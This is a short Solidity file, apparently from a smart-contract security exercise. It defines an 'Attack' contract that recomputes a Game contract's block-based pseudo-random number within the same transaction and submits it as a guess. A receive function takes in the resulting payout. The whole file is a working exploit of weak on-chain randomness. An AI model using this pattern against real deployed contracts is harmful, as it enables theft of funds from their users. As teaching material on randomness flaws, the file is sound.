// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity 0.8.20;
import "./Game.sol";
contract Attack{
    Game game;
    constructor (address _game){
        game = Game(_game);
    }

    function attack() public {
        uint256 guess = uint256(
            keccak256(abi.encodePacked(blockhash(block.number),block.timestamp))
        );
        game.declare(guess);

    }
    receive() external payable {}


    

}